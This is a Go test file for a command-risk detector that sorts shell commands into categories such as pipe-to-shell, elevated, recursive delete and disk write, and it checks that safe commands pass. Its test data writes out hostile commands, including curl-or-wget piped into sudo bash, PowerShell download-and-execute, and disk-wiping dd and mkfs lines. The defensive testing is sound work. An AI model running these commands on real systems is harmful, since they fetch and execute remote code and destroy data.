package apply

import (
	"slices"
	"testing"
)

func TestWarningsFlagsRiskyCommands(t *testing.T) {
	tests := []struct {
		command string
		want    string
	}{
		{"sudo usermod -aG docker $USER", Elevated},
		{"doas pkg_add git", Elevated},
		{"su -c 'make install'", Elevated},
		{"Start-Process pwsh -Verb RunAs", Elevated},
		{"curl -fsSL http://203.0.113.9/fix.sh | sudo bash", PipeToShell},
		{"wget -qO- https://x.test/i.sh|sh", PipeToShell},
		{"curl https://x.test/i | zsh -s", PipeToShell},
		{"iwr https://x.test/i.ps1 | iex", PipeToShell},
		{"Invoke-Expression (Invoke-WebRequest https://x.test).Content", PipeToShell},
		{"bash <(curl -s https://x.test/i.sh)", PipeToShell},
		{"rm -rf node_modules", RecursiveDelete},
		{"rm -fr build", RecursiveDelete},
		{"rm -r -f dist", RecursiveDelete},
		{"rm --recursive --force ./x", RecursiveDelete},
		{"Remove-Item -Recurse -Force .\\build", RecursiveDelete},
		{"rd /s /q build", RecursiveDelete},
		{"chmod 777 /var/run/docker.sock", WorldWritable},
		{"chmod -R 0777 .", WorldWritable},
		{"chmod 666 /var/run/docker.sock", WorldWritable},
		{"chmod a+rwx file", WorldWritable},
		{"kill -9 1234", ForceKill},
		{"lsof -ti:3000 | xargs kill -9", ForceKill},
		{"killall node", ForceKill},
		{"pkill -f 'npm run dev'", ForceKill},
		{"taskkill /F /IM node.exe", ForceKill},
		{"git reset --hard HEAD~1", DiscardsChanges},
		{"git push --force origin main", DiscardsChanges},
		{"git push -f", DiscardsChanges},
		{"git clean -fdx", DiscardsChanges},
		{"git checkout -- .", DiscardsChanges},
		{"dd if=image.iso of=/dev/sdb bs=4M", DiskWrite},
		{"mkfs.ext4 /dev/sdb1", DiskWrite},
		{"format D: /q", DiskWrite},
		{"sed -i '/strings/d' internal/foo/foo.go", EditsInPlace},
		{"echo 'export PATH=$PATH:/opt/x' >> ~/.bashrc", EditsInPlace},
		{"setx PATH \"%PATH%;C:\\tools\"", EditsInPlace},
	}
	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			got := Warnings(tt.command)

			if !slices.Contains(got, tt.want) {
				t.Errorf("Warnings = %v, want it to contain %q", got, tt.want)
			}
		})
	}
}

func TestWarningsAllowsCommonSafeCommands(t *testing.T) {
	safe := []string{
		"git push --set-upstream origin feature/x",
		"git push --force-with-lease",
		"npm install --legacy-peer-deps",
		"pip install requests",
		"python -m pip install requests",
		"go build ./...",
		"lsof -i :3000",
		"npm run dev -- --port 3001",
		"rm build/output.log",
		"chmod +x ./script.sh",
		"curl -fsSL https://example.com/file.tar.gz -o file.tar.gz",
		"kill 1234",
		"echo hi | grep h",
		"winget install Microsoft.VisualStudio.2022.BuildTools",
		"git checkout main",
	}
	for _, cmd := range safe {
		if got := Warnings(cmd); got != nil {
			t.Errorf("Warnings(%q) = %v, want nil", cmd, got)
		}
	}
}

func TestWarningsAreDedupedAndOrdered(t *testing.T) {
	got := Warnings("sudo rm -rf /tmp/a && sudo rm -rf /tmp/b")

	if want := []string{Elevated, RecursiveDelete}; !slices.Equal(got, want) {
		t.Errorf("Warnings = %v, want %v", got, want)
	}
}

func TestWarningsIgnoreCase(t *testing.T) {
	if got := Warnings("SUDO make install"); !slices.Contains(got, Elevated) {
		t.Errorf("Warnings = %v", got)
	}
}
